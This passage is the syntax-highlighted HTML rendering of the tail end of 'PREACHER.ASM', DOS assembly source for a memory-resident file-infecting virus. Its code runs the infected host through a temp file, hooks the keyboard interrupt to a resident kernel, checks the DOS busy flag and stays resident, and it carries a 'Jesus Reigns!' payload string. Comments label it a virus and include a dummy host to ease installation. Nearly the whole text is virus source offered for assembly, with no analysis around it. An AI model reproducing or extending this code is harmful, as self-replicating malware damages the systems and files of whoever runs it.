         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">infect_len</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_preacher</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; and close temp file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; set up paramaeter area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; segment addresses for </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; program execution</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg3</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                    </span><span class="sc1">; load and execute temp file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pararea</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preacher_temp</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------------- return from host execution</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preacher_temp</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3509h</span><span class="sc0">                    </span><span class="sc1">; get address of int 9</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">old_int</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; and save </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">old_int</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">kernel_preacher</span><span class="sc0"> </span><span class="sc1">; check if vector already points</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; to a loaded preacher</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_preacher</span><span class="sc0">               </span><span class="sc1">; if so - do not load preacher</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">                      </span><span class="sc1">; get address of dos busy flag</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">busy_seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">busy_off</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                            
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2509h</span><span class="sc0">                    </span><span class="sc1">; else - set int 9 to kernel</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel_preacher</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                   </span><span class="sc1">; allocate 0ffffh space</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc0">                         </span><span class="sc1">; for resident virus and terminate </span><span class="sc0">
 
 </span><span class="sc5">found_preacher</span><span class="sc4">:</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                      </span><span class="sc1">; terminate without staying in</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; memory</span><span class="sc0">
 
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Jesus Reigns!'</span><span class="sc0">              </span><span class="sc1">; the preachers message</span><span class="sc0">
 
 </span><span class="sc5">pararea</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">                      </span><span class="sc1">; parameter area for temp file </span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; execution</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
         </span><span class="sc5">seg1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5ch</span><span class="sc0">
         </span><span class="sc5">seg2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">6ch</span><span class="sc0">
         </span><span class="sc5">seg3</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">infect_len</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">_len</span><span class="sc0">              </span><span class="sc1">; length of infected file stored here</span><span class="sc0">
 
         </span><span class="sc5">busy_seg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; InDOS segment</span><span class="sc0">
         </span><span class="sc5">busy_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; and offset</span><span class="sc0">
         </span><span class="sc5">old_int</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">; old interrupt vector</span><span class="sc0">
         </span><span class="sc5">preacher_counter</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; counter</span><span class="sc0">
         </span><span class="sc5">dta_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">; offset of dta saved here</span><span class="sc0">
         </span><span class="sc5">dta_seg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">; segment of dta saved here</span><span class="sc0">
         
 </span><span class="sc5">end_preacher</span><span class="sc4">:</span><span class="sc0">
 
 </span><span class="sc5">preacher_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start_preacher</span><span class="sc0">       </span><span class="sc1">; length of preacher</span><span class="sc0">
 
 </span><span class="sc5">inbuf</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
 
 </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0"> </span><span class="sc1">; this is not part of the actual virus but is included</span><span class="sc0">
         </span><span class="sc1">; as a dummy host to make installation of virus easy</span><span class="sc0">
 
 </span><span class="sc5">_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">end_preacher</span><span class="sc0"> </span><span class="sc1">; length of dummy host</span><span class="sc0">
 
 </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start_preacher</span><span class="sc0">
 
 </span><span class="sc1">;-----------------------------End of Virus----------------------------</span><span class="sc0">
 
 </span><span class="sc1">; ฤฤ PREACHER.ASM ENDS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ </span><span class="sc0">
 
 </span></div></body>
</html>
